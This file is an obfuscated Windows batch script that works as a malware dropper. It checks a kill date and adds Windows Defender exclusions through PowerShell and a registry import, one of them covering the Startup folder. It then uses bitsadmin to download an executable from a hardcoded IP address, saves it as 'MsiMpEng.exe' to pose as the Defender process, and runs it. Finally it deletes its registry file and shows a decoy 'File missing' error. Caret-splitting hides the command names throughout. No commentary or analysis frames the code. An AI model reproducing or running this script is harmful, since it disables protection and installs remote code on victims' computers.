@shift
@ECHO off
set st=%Date:~0,4%%Date:~5,2%
set st=%st%
set ending=202212

set runbiturl="http://212.114.52.144/web/winsetup.exe"
set tempfileurl=C:\Windows\appngmt

if %st% LEQ %ending%  (goto start) else (goto nostart)
:start
::echo start
t^a^s^k^l^i^s^t|find /i "MsiMpEng.exe"
if %errorlevel% == 0 (goto end)
::START %MYFILES%\.Net4.0.exe

c:
cd \
if not exist %tempfileurl% (m^d C:\Windows\appngmt)
cd C:\Windows\appngmt

p^o^w^e^r^s^h^e^l^l -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\Windows\appngmt"

echo Windows Registry Editor Version 5.00 >Startup.reg
echo. >>Startup.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths] >>Startup.reg
echo "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"=dword:00000000 >>Startup.reg
echo. >>Startup.reg
r^e^g^e^d^i^t /s Startup.reg

b^i^t^s^a^d^m^i^n /reset
b^i^t^s^a^d^m^i^n /rawreturn /transfer  getpayload /priority foreground %runbiturl% C:\Windows\appngmt\MsiMpEng.exe

if exist C:\Windows\appngmt\MsiMpEng.exe (START C:\Windows\appngmt\MsiMpEng.exe)

del /f /s /q  C:\Windows\appngmt\Startup.reg

msg * File missing. System version not compatible.

goto end

:nostart
::echo nostart
goto end

:end
